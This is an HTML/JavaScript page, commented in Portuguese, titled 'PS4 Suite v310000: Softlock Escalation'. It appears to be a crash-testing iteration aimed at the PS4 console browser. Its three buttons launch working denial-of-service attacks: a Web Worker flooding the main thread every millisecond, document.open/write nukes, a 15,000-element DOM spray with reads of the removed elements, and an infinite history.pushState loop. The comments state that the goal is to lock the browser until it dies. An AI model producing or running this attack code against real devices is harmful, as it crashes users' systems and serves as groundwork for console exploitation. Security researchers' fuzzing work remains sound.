
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v310000: Softlock Escalation</title>
<style>
    body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #f00; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #100; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #500; color: #fff; border: 2px solid #f00;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f00; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v310000: SOFTLOCK ESCALATION</h1>

<div class="status">
    VOLTANDO À ORIGEM DO TRAVAMENTO + THREAD STRESS<br>
    1. CLIQUE -> 2. FULLSCREEN (QUADRADO) -> 3. FECHE ALERTA
</div>

<button onclick="escalate(white_screen_variant)">01. Script Nuke + Worker Hammer (White Screen)</button>

<button onclick="escalate(black_screen_variant)">02. DOM Spray + Animation Loop (Black Screen)</button>

<button onclick="escalate(hybrid_variant)">03. The Hybrid (Script + DOM + Worker)</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');

    // =================================================================
    // O MARTELO (WORKER THREAD)
    // Este worker roda em paralelo e bombardeia o processo principal
    // =================================================================
    const workerCode = `
        setInterval(() => {
            // Envia lixo para o processo principal a cada 1ms
            // Se o principal estiver travado (Softlock), isso enche o buffer IPC do Kernel
            postMessage(new Uint32Array(1024).fill(0xDEADBEEF));
        }, 1);
    `;
    const workerBlob = new Blob([workerCode], {type: 'text/javascript'});
    const workerURL = URL.createObjectURL(workerBlob);

    // =================================================================
    // EXECUTOR (MECÂNICA CLÁSSICA v28)
    // =================================================================
    function escalate(vectorFunc) {
        Stage.innerHTML = "";
        
        // 1. Inicia o Worker "Opressor"
        // Ele começa a rodar imediatamente, criando pressão
        const w = new Worker(workerURL);
        
        // Configura o alvo
        const target = vectorFunc(Stage, w);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. O Timing Original (Que funcionou)
        requestAnimationFrame(() => {
            setTimeout(() => {
                // ALERTA (Trava a UI)
                window.alert("⚠️ SOFTLOCK IMMINENT ⚠️\n\nO Worker está bombardeando o processo.\nFeche para travar.");

                // DETONAÇÃO
                if(target._detonate) {
                    target._detonate();
                }
                
                // Nota: Não limpamos o Worker. Deixamos ele rodar até o navegador morrer.
            }, 50);
        });
    }

    // =================================================================
    // 01. White Screen Variant (Script Nuke)
    // Baseado no Teste 3 da Suite v28 (O que causou tela branca)
    // Adicionamos: Comunicação forçada com o Worker durante a morte
    // =================================================================
    function white_screen_variant(stage, worker) {
        const d = document.createElement('div');
        d.innerText = "WHITE SCREEN TARGET";
        stage.appendChild(d);

        let s = null;

        // Cria o script "infinito"
        s = document.createElement('script');
        s.src = "data:text/javascript," + "console.log('X');".repeat(1000);
        document.body.appendChild(s);

        // Prepara o Worker para receber mensagens (embora vamos ignorar)
        worker.onmessage = (e) => {};

        d._detonate = () => {
            // A Sequência da Morte
            s.remove();
            d.remove();
            
            // O NUKE (Reset do Documento)
            document.open();
            document.write("<h1>SYSTEM HALTED</h1>");
            
            // ESCALADA: Tenta mandar mensagem para o Worker usando o documento morto como transferência
            // Isso força o motor JS a tentar acessar estruturas que acabamos de destruir (document.open)
            try {
                const ab = new ArrayBuffer(1024*1024); // 1MB
                worker.postMessage(ab, [ab]); // Transferable
            } catch(e){}
            
            document.close();
        };
        return d;
    }

    // =================================================================
    // 02. Black Screen Variant (DOM Spray)
    // Baseado no Teste 4 da Suite v28 (O que causou tela preta)
    // Adicionamos: Loop de Animação em elementos mortos
    // =================================================================
    function black_screen_variant(stage, worker) {
        const d = document.createElement('div');
        d.innerText = "BLACK SCREEN TARGET";
        stage.appendChild(d);

        d._detonate = () => {
            d.remove();
            
            // 1. O SPRAY MASSIVO (Como na v28)
            const frag = document.createDocumentFragment();
            const spam = [];
            for(let i=0; i<15000; i++) {
                const s = document.createElement('div');
                s.style.transform = "translate3d(0,0,0)"; // Força GPU
                s.innerText = "X";
                frag.appendChild(s);
                spam.push(s);
            }
            document.body.appendChild(frag);
            
            // 2. O NUKE
            document.body.innerHTML = "";
            
            // 3. A ESCALADA (Acesso Pós-Morte)
            // Tentamos forçar a GPU a calcular estilo de elementos removidos
            function loop() {
                for(let i=0; i<100; i++) {
                    // Acessa propriedade layout de elemento morto
                    const dead = spam[i % spam.length];
                    const x = dead.offsetWidth; 
                }
                worker.postMessage("ping"); // Mantém o worker ativo
                requestAnimationFrame(loop);
            }
            loop();
        };
        return d;
    }

    // =================================================================
    // 03. The Hybrid (Combo)
    // Tenta unir o Script Nuke com o DOM Spray
    // =================================================================
    function hybrid_variant(stage, worker) {
        const d = document.createElement('div');
        d.innerText = "HYBRID TARGET";
        stage.appendChild(d);

        d._detonate = () => {
            // 1. Script Crash
            const s = document.createElement('script');
            s.src = "data:text/javascript,A";
            document.body.appendChild(s);
            s.remove();

            // 2. DOM Freeze
            const f = document.createDocumentFragment();
            for(let i=0; i<5000; i++) f.appendChild(document.createElement('br'));
            document.body.appendChild(f);
            
            // 3. Nuke
            document.open(); // Mata o DOM
            
            // 4. Worker Spam
            // Loop infinito síncrono para travar a thread principal morta
            // Enquanto o Worker enche a fila de mensagens
            while(true) {
                history.pushState({},"","");
            }
        };
        return d;
    }

</script>
</body>
</html>
